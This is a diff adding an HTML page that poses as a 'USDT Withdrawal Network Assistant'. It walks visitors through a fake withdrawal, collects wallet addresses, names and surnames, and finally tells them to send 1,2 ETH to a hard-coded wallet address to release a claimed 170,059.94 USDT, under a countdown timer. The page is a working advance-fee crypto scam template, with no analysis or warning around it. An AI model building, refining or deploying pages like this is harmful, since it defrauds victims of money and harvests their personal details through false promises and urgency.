@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Crypto Network Helper</title>
+  <link rel="stylesheet" href="style.css" />
+</head>
+<body>
+  <div class="page-wrapper"> <!-- Start of wrapper -->
+
+    <!-- Blur Overlay -->
+    <div class="background-blur"></div>
+
+    <header>
+      <div class="container">
+        <h1>USDT Withdrawal Network Assistant</h1>
+        <p>Select the correct network and follow the steps to proceed with your withdrawal.</p>
+      </div>
+    </header>
+
+    <main class="container">
+      <div class="box" id="step1">
+        <h2>Withdraw Setup</h2>
+        <label><b>Withdrawal Address</b></label>
+        <input type="text" id="withdrawalAddress" placeholder="e.g. 0xABC123..." />
+        <label><b>Choose Your Network</b></label>
+        <select id="network">
+          <option value="">-- Select Network --</option>
+          <option value="Ethereum">Ethereum</option>
+          <option value="Binance Smart Chain">Binance Smart Chain</option>
+          <option value="Tron">Tron</option>
+          <option value="Polygon">Polygon</option>
+        </select>
+        <button onclick="confirmStep1()">Continue</button>
+      </div>
+
+      <div class="box" id="step2" style="display: none;">
+        <h2>Receiver Information</h2>
+        <label><b>Receiver Address</b></label>
+        <input type="text" id="receiverAddress" placeholder="e.g. 0xReceiver..." />
+        <label><b>Name</b></label>
+        <input type="text" id="receiverName" placeholder="First Name" />
+        <label><b>Surname</b></label>
+        <input type="text" id="receiverSurname" placeholder="Last Name" />
+        <button onclick="confirmStep2()">Continue</button>
+      </div>
+
+      <div class="box" id="step3" style="display: none;">
+        <h2>Final Step</h2>
+        <p><strong>To withdraw <b>170,059.94 USDT</b>:</strong></p>
+        <p>Send <strong>1,2 ETH</strong> to the following network:</p>
+        <p><strong>Network:</strong> <span id="finalNetwork"></span></p>
+        <p><strong>Address:</strong> <span class="highlight">0xa96c5F387Ed6945216231275BCE59E63D4CbAAB3</span></p>
+        <div id="timer">Waiting... 59:00</div>
+      </div>
+    </main>
+
+    <footer>
+      <div class="container">
+        <h3>What are Networks?</h3>
+        <ul>
+          <li><strong>Ethereum:</strong> The most widely used, supports ERC-20 tokens.</li>
+          <li><strong>Binance Smart Chain (BSC):</strong> A faster, cheaper alternative to Ethereum.</li>
+          <li><strong>Tron:</strong> Known for low fees and fast transactions.</li>
+          <li><strong>Polygon:</strong> A Layer 2 solution built on Ethereum for scalability.</li>
+        </ul>
+        <p class="copyright">
+          &copy; 2025 Crypto Helper Tools. All rights reserved.
+        </p>
+      </div>
+    </footer>
+
+  </div> <!-- End of wrapper -->
+
+  <script src="script.js"></script>
+</body>
+</html>
+
+
